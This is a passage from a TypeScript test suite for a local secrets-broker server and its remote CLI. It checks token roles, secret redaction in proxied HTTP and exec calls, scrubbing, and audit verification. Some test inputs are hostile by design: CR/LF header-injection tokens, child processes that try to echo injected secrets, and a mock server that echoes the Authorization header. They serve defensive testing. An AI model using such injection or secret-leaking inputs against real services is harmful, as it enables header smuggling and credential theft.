        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/secrets',
        headers: brokerHeaders,
        body: { alias: 'evil/new', value: 'should_fail_123', policy: { allowedHosts: ['example.com'], allowedTools: ['http'] } },
      });
      assert.equal(brokerCreate.status, 403);
      assert.deepEqual(brokerCreate.json, expectedForbidden);

      const brokerDelete = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'DELETE',
        path: '/v1/secrets/stripe/dual_key',
        headers: brokerHeaders,
      });
      assert.equal(brokerDelete.status, 403);
      assert.deepEqual(brokerDelete.json, expectedForbidden);

      const brokerGrant = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/grants',
        headers: brokerHeaders,
        body: { alias: 'stripe/dual_key', agentId: 'rogue' },
      });
      assert.equal(brokerGrant.status, 403);
      assert.deepEqual(brokerGrant.json, expectedForbidden);

      const brokerBench = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/benchmark',
        headers: brokerHeaders,
        body: { microIterations: 5 },
      });
      assert.equal(brokerBench.status, 403);
      assert.deepEqual(brokerBench.json, expectedForbidden);

      // Broker token gets 200 on all Broker-allowed endpoints + authenticated /health stats
      const brokerHealth = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/health',
        headers: brokerHeaders,
      });
      assert.equal(brokerHealth.status, 200);
      assert.equal(brokerHealth.json.secretsCount, 1);
      assert.equal(brokerHealth.text.includes(secretVal), false);

      const brokerHandles = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/v1/handles',
        headers: brokerHeaders,
      });
      assert.equal(brokerHandles.status, 200);
      assert.equal(brokerHandles.json.ok, true);
      assert.equal(brokerHandles.json.handles.length, 1);
      assert.equal(brokerHandles.json.handles[0].handle, 'pw1://stripe/dual_key');
      assert.equal(brokerHandles.text.includes(secretVal), false);

      const brokerSecretsMeta = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/v1/secrets',
        headers: brokerHeaders,
      });
      assert.equal(brokerSecretsMeta.status, 200);
      assert.equal(brokerSecretsMeta.text.includes(secretVal), false);

      const brokerHttp = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/proxy/http',
        headers: brokerHeaders,
        body: {
          url: 'http://api.dual.internal/check',
          auth: { type: 'bearer', secret: 'pw1://stripe/dual_key' },
          agentId: 'broker-agent',
          grantId,
        },
      });
      assert.equal(brokerHttp.status, 200);
      assert.equal(JSON.parse(String(brokerHttp.json.result.body)).authorized, true);
      assert.equal(brokerHttp.text.includes(secretVal), false);

      const brokerExec = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/proxy/exec',
        headers: brokerHeaders,
        body: {
          command: process.execPath,
          args: ['-e', 'process.stdout.write("len=" + process.env.DUAL_K.length + " leak=" + process.env.DUAL_K)'],
          secretEnv: { DUAL_K: 'pw1://stripe/dual_key' },
          agentId: 'broker-agent',
          grantId,
        },
      });
      assert.equal(brokerExec.status, 200);
      assert.equal(brokerExec.json.result.stdout, `len=${secretVal.length} leak=[REDACTED:pw1://stripe/dual_key]`);

      const brokerScrub = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/v1/scrub',
        headers: brokerHeaders,
        body: { text: `raw=${secretVal}` },
      });
      assert.equal(brokerScrub.status, 200);
      assert.equal(brokerScrub.json.result.scrubbedText, 'raw=[REDACTED:pw1://stripe/dual_key]');

      const brokerAudit = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'GET',
        path: '/v1/audit?limit=10',
        headers: brokerHeaders,
      });
      assert.equal(brokerAudit.status, 200);
      assert.equal(brokerAudit.json.verification.valid, true);

      // Broker token succeeds on /mcp and verifies exact MCP tool annotations.readOnlyHint
      const mcpList = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'POST',
        path: '/mcp',
        headers: brokerHeaders,
        body: { jsonrpc: '2.0', id: 42, method: 'tools/list' },
      });
      assert.equal(mcpList.status, 200);
      const annotationsByName = Object.fromEntries(
        (mcpList.json.result.tools as { name: string; annotations?: { readOnlyHint?: boolean } }[]).map((t) => [
          t.name,
          t.annotations?.readOnlyHint,
        ])
      );
      assert.deepEqual(annotationsByName, {
        pw1_list_handles: true,
        pw1_http_request: false,
        pw1_exec_command: false,
        pw1_scrub_output: true,
        pw1_audit_verify: true,
      });

      // Admin token can still delete secret
      const adminDelete = await httpRawRequest({
        baseUrl: srv.baseUrl,
        method: 'DELETE',
        path: '/v1/secrets/stripe/dual_key',
        headers: adminHeaders,
      });
      assert.equal(adminDelete.status, 200);
      assert.equal(adminDelete.json.deleted, true);
    } finally {
      await srv.close();
      await new Promise<void>((r) => upstream.close(() => r()));
    }

    // Broker-only loopback mode (brokerToken set without authToken): broker endpoints 200, admin endpoints 403, anon 401
    const brokerOnlySrv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'broker-only-loopback-key-2026',
      authToken: '',
      brokerToken,
      scryptN: 1024,
    });
    try {
      assert.equal(brokerOnlySrv.authEnabled, true);
      assert.equal(brokerOnlySrv.brokerAuthEnabled, true);

      const anonRes = await httpRawRequest({ baseUrl: brokerOnlySrv.baseUrl, method: 'GET', path: '/v1/handles' });
      assert.equal(anonRes.status, 401);

      const okHandles = await httpRawRequest({
        baseUrl: brokerOnlySrv.baseUrl,
        method: 'GET',
        path: '/v1/handles',
        headers: { Authorization: `Bearer ${brokerToken}` },
      });
      assert.equal(okHandles.status, 200);
      assert.deepEqual(okHandles.json, { ok: true, handles: [] });

      const forbiddenCreate = await httpRawRequest({
        baseUrl: brokerOnlySrv.baseUrl,
        method: 'POST',
        path: '/v1/secrets',
        headers: { Authorization: `Bearer ${brokerToken}` },
        body: { alias: 'a/b', value: '12345678', policy: { allowedHosts: ['example.com'], allowedTools: ['http'] } },
      });
      assert.equal(forbiddenCreate.status, 403);
      assert.equal(forbiddenCreate.json.error.code, 'FORBIDDEN');
    } finally {
      await brokerOnlySrv.close();
    }
  });

  test('30. Remote CLI subcommands (handles, http, exec, scrub, audit-verify) work E2E with Broker token and never leak tokens', async () => {
    const adminToken = 'pw1-cli-admin-token-secret-2026-1111';
    const brokerToken = 'pw1-cli-broker-token-secret-2026-2222';
    const secretVal = 'sk_' + 'live_RemoteCliSecret776655';

    const upstream = createServer((req: IncomingMessage, res: ServerResponse) => {
      const chunks: Buffer[] = [];
      req.on('data', (c: Buffer) => chunks.push(c));
      req.on('end', () => {
        const reqUrl = new URL(req.url ?? '/', 'http://api.cli.internal');
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(
          JSON.stringify({
            method: req.method,
            path: reqUrl.pathname,
            query: Object.fromEntries(reqUrl.searchParams.entries()),
            authHeader: req.headers['authorization'] ?? null,
            customAuthHeader: req.headers['x-api-token'] ?? null,
            xTrace: req.headers['x-trace'] ?? null,
            xExtra: req.headers['x-extra'] ?? null,
            body: Buffer.concat(chunks).toString('utf8'),
          })
        );
      });
    });
    await new Promise<void>((r) => upstream.listen(0, '127.0.0.1', r));
    const upPort = (upstream.address() as AddressInfo).port;

    const srv = await startPasswordOneServer({
      port: 0,
      host: '127.0.0.1',
      dataPath: ':memory:',
      masterKey: 'remote-cli-e2e-master-key-2026',
      authToken: adminToken,
      brokerToken,
      scryptN: 1024,
      brokerOptions: {
        resolveOverrides: {
          'api.cli.internal': { address: '127.0.0.1', port: upPort },
        },
      },
    });

    try {
      srv.vault.upsertSecret({
        alias: 'stripe/cli_key',
        value: secretVal,
        description: 'Remote CLI E2E key',
        policy: {
          allowedHosts: ['api.cli.internal'],
          allowedTools: ['http', 'exec'],
          allowedCommands: ['node'],
          allowHttp: true,
          allowEnvInjection: true,
          requireGrant: true,
        },
      });
      const grant = srv.vault.createGrant({
        alias: 'stripe/cli_key',
        agentId: 'cli-agent',
        maxUses: 10,
        ttlSeconds: 120,
      });

      const baseEnv: Record<string, string | undefined> = {
        PW1_URL: srv.baseUrl,
        PW1_BROKER_TOKEN: brokerToken,
      };

      const runCaptured = async (
        argv: string[],
        envOverride?: Record<string, string | undefined>,
        stdinText?: string
      ) => {
        const outStream = new PassThrough();
        const errStream = new PassThrough();
        const inStream = new PassThrough();
        let outText = '';
        let errText = '';
        outStream.on('data', (c: Buffer) => {
          outText += c.toString('utf8');
        });
        errStream.on('data', (c: Buffer) => {
          errText += c.toString('utf8');
        });
        if (stdinText !== undefined) {
          inStream.end(stdinText, 'utf8');
        } else {
          inStream.end();
        }
        const res = await runRemoteCli(argv, envOverride ?? baseEnv, {
          stdin: inStream,
          stdout: outStream,
          stderr: errStream,
        });
        assert.equal(outText, res.stdout);
        assert.equal(errText, res.stderr);
        assert.equal(outText.includes(brokerToken), false);
        assert.equal(errText.includes(brokerToken), false);
        assert.equal(outText.includes(adminToken), false);
        assert.equal(errText.includes(adminToken), false);
        assert.equal(outText.includes(secretVal), false);
        assert.equal(errText.includes(secretVal), false);
        return res;
      };

      // 1. handles
      const handlesRes = await runCaptured(['handles']);
      assert.equal(handlesRes.exitCode, 0);
      assert.equal(handlesRes.stderr, '');
      const handlesJson = JSON.parse(handlesRes.stdout);
      assert.equal(handlesJson.ok, true);
      assert.equal(handlesJson.handles[0].handle, 'pw1://stripe/cli_key');

      // 2. http with --auth-bearer, repeatable --header, repeatable --query, --body, --method, --agent-id, --grant-id, --timeout-ms
      const httpBearerRes = await runCaptured([
        'http',
        '--url',
        'http://api.cli.internal/v1/charge',
        '--method',
        'POST',
        '--header',
        'X-Trace: trace-1:ok',
        '--header',
        'X-Extra: two',
        '--query',
        'mode=live',
        '--query',
        'tag=a=b',
        '--body',
        '{"amount":100}',
        '--auth-bearer',
        'pw1://stripe/cli_key',
        '--agent-id',
        'cli-agent',
        '--grant-id',
        grant.grantId,
        '--timeout-ms',
        '5000',
      ]);
      assert.equal(httpBearerRes.exitCode, 0);
      const httpBearerBody = JSON.parse(JSON.parse(httpBearerRes.stdout).result.body);
      assert.equal(httpBearerBody.method, 'POST');
      assert.equal(httpBearerBody.query.mode, 'live');
      assert.equal(httpBearerBody.query.tag, 'a=b');
      assert.equal(httpBearerBody.xTrace, 'trace-1:ok');
      assert.equal(httpBearerBody.xExtra, 'two');
      assert.equal(httpBearerBody.body, '{"amount":100}');
      assert.equal(httpBearerBody.authHeader, 'Bearer [REDACTED:pw1://stripe/cli_key]');

      // 3. http with --auth-header, --auth-basic, --auth-query
      const httpHeaderRes = await runCaptured([
        'http',
        '--url',
        'http://api.cli.internal/v1/hdr',
        '--auth-header',
        'X-Api-Token=pw1://stripe/cli_key',
        '--agent-id',
        'cli-agent',
        '--grant-id',
        grant.grantId,
      ]);
      assert.equal(httpHeaderRes.exitCode, 0);
      assert.equal(
        JSON.parse(JSON.parse(httpHeaderRes.stdout).result.body).customAuthHeader,
        '[REDACTED:pw1://stripe/cli_key]'
      );

      const httpBasicRes = await runCaptured([
        'http',
        '--url',
        'http://api.cli.internal/v1/basic',
        '--auth-basic',
        'merchant:pw1://stripe/cli_key',
        '--agent-id',
        'cli-agent',
        '--grant-id',
        grant.grantId,
      ]);
      assert.equal(httpBasicRes.exitCode, 0);
      assert.equal(
        JSON.parse(JSON.parse(httpBasicRes.stdout).result.body).authHeader,
        'Basic [REDACTED:pw1://stripe/cli_key]'
      );

      const httpQueryRes = await runCaptured([
        'http',
        '--url',
        'http://api.cli.internal/v1/qry',
        '--auth-query',
        'api_key=pw1://stripe/cli_key',
        '--agent-id',
        'cli-agent',
        '--grant-id',
        grant.grantId,
      ]);
      assert.equal(httpQueryRes.exitCode, 0);
      assert.equal(
        JSON.parse(JSON.parse(httpQueryRes.stdout).result.body).query.api_key,
        '[REDACTED:pw1://stripe/cli_key]'
      );

      // 4. exec with repeatable --arg, --secret-env, --env, --cwd, --timeout-ms, --agent-id, --grant-id
      const execRes = await runCaptured([
        'exec',
        '--command',
        process.execPath,
        '--arg',
        '-e',
        '--arg',
        'process.stdout.write(JSON.stringify({ label: process.env.CLI_LABEL, len: process.env.CLI_SEC.length, echoed: process.env.CLI_SEC }))',
        '--secret-env',
        'CLI_SEC=pw1://stripe/cli_key',
        '--env',
        'CLI_LABEL=ok',
        '--cwd',
        process.cwd(),
        '--timeout-ms',
        '5000',
        '--agent-id',
        'cli-agent',
        '--grant-id',
        grant.grantId,
      ]);
      assert.equal(execRes.exitCode, 0);
      const execPayload = JSON.parse(execRes.stdout);
      assert.equal(execPayload.ok, true);
      assert.equal(execPayload.result.exitCode, 0);
      const execOutObj = JSON.parse(String(execPayload.result.stdout));
      assert.equal(execOutObj.label, 'ok');
      assert.equal(execOutObj.len, secretVal.length);
      assert.equal(execOutObj.echoed, '[REDACTED:pw1://stripe/cli_key]');

      // 5. scrub via --text and via stdin
      const scrubFlagRes = await runCaptured(['scrub', '--text', `leaked=${secretVal}`]);
      assert.equal(scrubFlagRes.exitCode, 0);
      assert.equal(JSON.parse(scrubFlagRes.stdout).result.scrubbedText, 'leaked=[REDACTED:pw1://stripe/cli_key]');

      const scrubStdinRes = await runCaptured(['scrub'], baseEnv, `stdin_b64=${Buffer.from(secretVal).toString('base64')}`);
      assert.equal(scrubStdinRes.exitCode, 0);
      assert.equal(JSON.parse(scrubStdinRes.stdout).result.scrubbedText, 'stdin_b64=[REDACTED:pw1://stripe/cli_key]');

      // 6. audit-verify with --limit
      const auditRes = await runCaptured(['audit-verify', '--limit', '3']);
      assert.equal(auditRes.exitCode, 0);
      const auditPayload = JSON.parse(auditRes.stdout);
      assert.equal(auditPayload.ok, true);
      assert.equal(auditPayload.verification.valid, true);
      assert.equal(auditPayload.entries.length <= 3, true);

      // 7. Security: reject CR/LF in tokens without leaking token
      const badToken = 'injected-broker-token\r\nX-Evil: 1';
      const crlfRes = await runCaptured(['handles'], {
        PW1_URL: srv.baseUrl,
        PW1_BROKER_TOKEN: badToken,
      });
      assert.notEqual(crlfRes.exitCode, 0);
      assert.equal(crlfRes.stdout, '');
      assert.equal(crlfRes.stderr.includes('injected-broker-token'), false);
      assert.equal(crlfRes.stderr.includes('X-Evil'), false);
      const crlfErr = JSON.parse(crlfRes.stderr);
      assert.equal(crlfErr.ok, false);
      assert.match(crlfErr.error.message, /CR\/LF/);

      // 8. Security: non-2xx (401) prints sanitized JSON error to stderr and never leaks wrong token
      const wrongToken = 'wrong-sentinel-token-never-print-8899';
      const unauthRes = await runCaptured(['handles'], {
        PW1_URL: srv.baseUrl,
        PW1_BROKER_TOKEN: wrongToken,
      });
      assert.notEqual(unauthRes.exitCode, 0);
      assert.equal(unauthRes.stdout, '');
      assert.equal(unauthRes.stderr.includes(wrongToken), false);
      assert.equal(unauthRes.stderr.toLowerCase().includes('authorization'), false);
      const unauthErr = JSON.parse(unauthRes.stderr);
      assert.equal(unauthErr.ok, false);
      assert.equal(unauthErr.status, 401);
      assert.equal(unauthErr.error.code, 'UNAUTHORIZED');

      // 9. Security: network error & timeout sanitize token and exit non-zero
      const connRefusedRes = await runCaptured(['handles'], {
        PW1_URL: 'http://127.0.0.1:1',
        PW1_BROKER_TOKEN: brokerToken,
      });
      assert.notEqual(connRefusedRes.exitCode, 0);
      assert.equal(connRefusedRes.stdout, '');
      assert.equal(connRefusedRes.stderr.includes(brokerToken), false);
      const netErr = JSON.parse(connRefusedRes.stderr);
      assert.equal(netErr.ok, false);
      assert.equal(netErr.error.code, 'NETWORK_ERROR');
      assert.equal(netErr.error.message.length > 0, true);

      // Timeout + hostile server echoing Authorization header back in 500 response
      const slowOrHostile = createServer((req: IncomingMessage, res: ServerResponse) => {
        if (req.url === '/slow/v1/handles') {
          // Intentionally stall beyond client timeout
          return;
        }
        res.writeHead(500, { 'content-type': 'application/json' });
        res.end(
          JSON.stringify({
            ok: false,
            error: {
              code: 'LEAKY_UPSTREAM',
              message: `Echoed Authorization: ${String(req.headers['authorization'] ?? '')}`,
            },
          })
        );
      });
      await new Promise<void>((r) => slowOrHostile.listen(0, '127.0.0.1', r));
      const hostilePort = (slowOrHostile.address() as AddressInfo).port;
      try {
        const timeoutRes = await runCaptured(['handles'], {
          PW1_URL: `http://127.0.0.1:${hostilePort}/slow`,
          PW1_BROKER_TOKEN: brokerToken,
          PW1_TIMEOUT_MS: '120',
        });
        assert.notEqual(timeoutRes.exitCode, 0);
        assert.equal(timeoutRes.stderr.includes(brokerToken), false);
        assert.equal(JSON.parse(timeoutRes.stderr).error.code, 'TIMEOUT');

        const hostileRes = await runCaptured(['handles'], {
          PW1_URL: `http://127.0.0.1:${hostilePort}`,
          PW1_BROKER_TOKEN: brokerToken,
        });
        assert.notEqual(hostileRes.exitCode, 0);
        assert.equal(hostileRes.stderr.includes(brokerToken), false);
        assert.equal(hostileRes.stderr.includes(`Bearer ${brokerToken}`), false);
      } finally {
        await new Promise<void>((r) => slowOrHostile.close(() => r()));
      }

      // 10. PW1_AUTH_TOKEN fallback when PW1_BROKER_TOKEN unset, and CR/LF rejection on PW1_AUTH_TOKEN
      const fallbackRes = await runCaptured(['handles'], {
        PW1_URL: srv.baseUrl,
        PW1_AUTH_TOKEN: adminToken,
      });
      assert.equal(fallbackRes.exitCode, 0);
      assert.equal(JSON.parse(fallbackRes.stdout).handles[0].handle, 'pw1://stripe/cli_key');

      const crlfAuthRes = await runCaptured(['handles'], {
        PW1_URL: srv.baseUrl,
        PW1_AUTH_TOKEN: 'admin-token\nX-Injected: 1',
      });
      assert.notEqual(crlfAuthRes.exitCode, 0);
      assert.equal(crlfAuthRes.stderr.includes('admin-token'), false);
      assert.match(JSON.parse(crlfAuthRes.stderr).error.message, /CR\/LF/);

      // 11. Direct spawned `node src/cli.ts handles` subprocess check
      const cliChild = spawn(process.execPath, ['src/cli.ts', 'handles'], {
        cwd: process.cwd(),
        env: {
          ...process.env,
          PW1_URL: srv.baseUrl,
          PW1_BROKER_TOKEN: brokerToken,
        },
        stdio: ['ignore', 'pipe', 'pipe'],
      });
      let cliOut = '';
      let cliErr = '';
      cliChild.stdout?.on('data', (c: Buffer) => {
        cliOut += c.toString('utf8');
      });
      cliChild.stderr?.on('data', (c: Buffer) => {
        cliErr += c.toString('utf8');
      });
      const cliExitCode = await new Promise<number | null>((resolve) => {
        cliChild.once('exit', (code: number | null) => resolve(code));
      });
      assert.equal(cliExitCode, 0);
      assert.equal(cliErr, '');
      assert.equal(cliOut.includes(brokerToken), false);
      assert.equal(cliOut.includes(secretVal), false);
      assert.equal(JSON.parse(cliOut).handles[0].handle, 'pw1://stripe/cli_key');
    } finally {
      await srv.close();
      await new Promise<void>((r) => upstream.close(() => r()));
    }
  });
});
